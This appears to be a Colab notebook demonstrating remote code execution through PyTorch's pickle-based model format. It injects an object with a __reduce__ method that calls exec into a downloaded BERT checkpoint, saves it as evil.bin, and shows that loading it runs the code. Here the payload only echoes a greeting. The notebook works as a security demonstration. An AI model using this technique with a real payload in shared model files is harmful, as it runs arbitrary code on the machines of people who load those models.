{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/alex46300/Tool-In-Action-2018/blob/master/Demo_RCE_PyTorch.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "First download a PyTorch model, our example will take Bert from HuggingFace."
      ],
      "metadata": {
        "id": "irN43NZ3YFof"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Bu-OKNsWCjmm"
      },
      "outputs": [],
      "source": [
        "from transformers import AutoTokenizer, AutoModelForMaskedLM\n",
        "\n",
        "tokenizer = AutoTokenizer.from_pretrained(\"google-bert/bert-base-uncased\")\n",
        "model = AutoModelForMaskedLM.from_pretrained(\"google-bert/bert-base-uncased\", use_safetensors=False)"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Restart runtime, then we change directory to get the raw model file."
      ],
      "metadata": {
        "id": "3g3TmosRYUO4"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "\n",
        "os.chdir(\"/root/.cache/huggingface/hub/models--google-bert--bert-base-uncased/snapshots\")\n",
        "os.chdir(\"./\" + os.listdir(\".\")[0])"
      ],
      "metadata": {
        "id": "7Debyh_VY7Ew"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Set the payload we want to inject, here, a simple print will be enough to provide us an evidence of the vulnerability of the pickle format."
      ],
      "metadata": {
        "id": "uVsWD5e-eEGy"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Payload to inject\n",
        "ON_REDUCE = \"\"\"\n",
        "import os;os.system('echo \"Hello Adeo !\"');print(\"Payload initialization\")\n",
        "\"\"\"\n",
        "\n",
        "class Payload:\n",
        "    def __reduce__(self):\n",
        "        return (exec, (ON_REDUCE,))"
      ],
      "metadata": {
        "id": "xEGWx0IQEajP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Defeat the serialization processof PyTorch."
      ],
      "metadata": {
        "id": "k7PLlZoLebDL"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import torch\n",
        "\n",
        "# Load a PyTorch model\n",
        "model = torch.load('pytorch_model.bin')\n",
        "\n",
        "# Inject the payload into the model's state_dict\n",
        "model['payload'] = Payload()\n",
        "\n",
        "# Overwrite the serialization magic number with the payload to use Pickle's vulnerability on __reduce__ method\n",
        "torch.serialization.MAGIC_NUMBER = Payload()"
      ],
      "metadata": {
        "id": "lvTmBdQDEuPf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Save the malicious model\n",
        "torch.save(model, '/content/evil.bin')\n",
        "os.chdir(\"/content/\")"
      ],
      "metadata": {
        "id": "-8phIModEzb1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Load the malicious model\n",
        "print('Loading the malicious model...')\n",
        "torch.load('evil.bin')\n",
        "print('Code Execution Done !')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wRnDezqpGLl1",
        "outputId": "827b2bae-b1c7-4713-a964-828d386d0f0c"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Loading the malicious model...\n",
            "Payload initialization\n",
            "Code Execution Done !\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Done !"
      ],
      "metadata": {
        "id": "WyWbg_gPej6h"
      }
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "THEMwVUGelSK"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}